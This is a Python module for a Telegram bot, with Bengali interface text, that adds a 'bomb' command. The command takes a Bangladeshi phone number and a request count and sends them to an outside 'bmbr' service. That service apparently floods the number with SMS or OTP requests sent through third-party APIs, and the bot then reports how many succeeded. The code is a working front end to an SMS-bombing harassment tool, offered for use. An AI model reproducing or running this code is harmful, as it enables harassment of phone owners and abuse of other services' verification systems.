import requests
import json
from telebot.types import Message
import re

def register(bot, custom_command_handler, command_prefixes_list):
    
    @custom_command_handler("bmb", "bomb")
    def handle_bomb(message: Message):
        chat_id = message.chat.id
        user_id = message.from_user.id if message.from_user else 0
        
        # Check if message text exists
        if not message.text:
            return
        
        # Extract command and get user input
        command_text = message.text.split(" ", 1)[0].lower()
        actual_command_len = 0
        for prefix in command_prefixes_list:
            if command_text.startswith(f"{prefix}bomb") or command_text.startswith(f"{prefix}বোমা"):
                actual_command_len = len(command_text)
                break
        
        user_input = message.text[actual_command_len:].strip()
        
        # Check if user provided input
        if not user_input:
            help_text = f"""❓ <b>বোমা API ব্যবহারের নিয়ম:</b>

<code>{command_prefixes_list[0]}bomb [ফোন নম্বর] [পরিমাণ]</code>
<code>{command_prefixes_list[1]}বোমা [ফোন নম্বর] [পরিমাণ]</code>

<b>উদাহরণ:</b>
<code>{command_prefixes_list[0]}bmb 01712345678 1</code>
<code>{command_prefixes_list[1]}bomb 01712345678 5</code>

<b>নোট:</b> পরিমাণ না দিলে ডিফল্ট ১টি রিকোয়েস্ট পাঠানো হবে।"""
            bot.reply_to(message, help_text, parse_mode="HTML")
            return
        
        # Parse phone number and amount
        parts = user_input.split()
        if len(parts) < 1:
            bot.reply_to(message, "❌ ফোন নম্বর প্রদান করুন!", parse_mode="HTML")
            return
        
        phone_number = parts[0]
        amount = 1  # Default amount
        
        if len(parts) >= 2 and parts[1].isdigit():
            amount = int(parts[1])
        
        # Validate and normalize phone number
        # This regex now allows +880, 880, or 0 at the beginning, followed by an 11-digit number
        if not re.match(r'^(\+880|880|0)?1[3-9]\d{8}$', phone_number):
            bot.reply_to(message, "❌ সঠিক বাংলাদেশি ফোন নম্বর দিন! (উদাহরণ: 01775179605)", parse_mode="HTML")
            return
        
        # Normalize the number by keeping only the last 11 digits
        # This handles inputs like +8801712345678 and 8801712345678
        normalized_number = phone_number[-11:]
        
        # Limit amount to prevent abuse
        if amount > 10:
            bot.reply_to(message, "⚠️ সর্বোচ্চ ১০টি রিকোয়েস্ট পাঠানো যাবে!", parse_mode="HTML")
            return
        
        # Send processing message
        processing_msg = bot.reply_to(message, f"🔄 <b>{normalized_number}</b> নম্বরে <b>{amount}</b>টি রিকোয়েস্ট পাঠানো হচ্ছে...\n\n⏳ <i>দয়া করে ২-৩ মিনিট অপেক্ষা করুন...</i>", parse_mode="HTML")
        
        try:
            # Prepare API request
            url = "https://noob-bmbr.vercel.app/bomb"
            payload = {
                "number": normalized_number,
                "amount": amount
            }
            headers = {
                'Content-Type': 'application/json'
            }
            
            # Send request to API with a 120-second timeout
            response = requests.post(url, json=payload, headers=headers, timeout=120)
            response.raise_for_status()
            
            # Parse response
            data = response.json()
            
            # Extract statistics
            successful_requests = data.get('successful_requests', 0)
            total_requests = data.get('total_requests_attempted', 0)
            
            if total_requests > 0:
                success_rate = (successful_requests / total_requests) * 100
            else:
                success_rate = 0
            
            # Count different status types
            details = data.get('details', [])
            success_count = sum(1 for api in details if api.get('status') == 'success')
            failed_count = sum(1 for api in details if api.get('status') == 'failed')
            error_count = sum(1 for api in details if api.get('status') == 'error')
            
            # Format response message
            result_message = f"""✅ <b>রিকোয়েস্ট সম্পন্ন হয়েছে!</b>

📱 <b>ফোন নম্বর:</b> <code>{normalized_number}</code>
🎯 <b>রিকোয়েস্ট পরিমাণ:</b> <code>{amount}</code>

📊 <b>ফলাফল:</b>
├─ 🟢 <b>সফল:</b> <code>{success_count}</code>
├─ 🔴 <b>ব্যর্থ:</b> <code>{failed_count}</code>
├─ ⚠️ <b>ত্রুটি:</b> <code>{error_count}</code>
└─ 📈 <b>সাকসেস রেট:</b> <code>{success_rate:.1f}%</code>

🔢 <b>মোট API কল:</b> <code>{total_requests}</code>
✅ <b>সফল API কল:</b> <code>{successful_requests}</code>"""

            # Edit the processing message with result
            bot.edit_message_text(
                result_message, 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
            
        except requests.exceptions.Timeout:
            bot.edit_message_text(
                "⏰ <b>টাইমআউট!</b> API সার্ভার খুব ধীর বা অনুপলব্ধ।", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except requests.exceptions.RequestException as e:
            bot.edit_message_text(
                f"❌ <b>নেটওয়ার্ক ত্রুটি!</b>\n\n<code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except json.JSONDecodeError:
            bot.edit_message_text(
                "❌ <b>API রেসপন্স পার্স করতে সমস্যা!</b> সার্ভার থেকে অবৈধ JSON পেয়েছি।", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except KeyError as e:
            bot.edit_message_text(
                f"❌ <b>API রেসপন্স ফরম্যাট সমস্যা!</b>\n\nঅনুপস্থিত ফিল্ড: <code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>অপ্রত্যাশিত ত্রুটি!</b>\n\n<code>{str(e)}</code>", 
                chat_id=chat_id, 
                message_id=processing_msg.message_id, 
                parse_mode="HTML"
            )
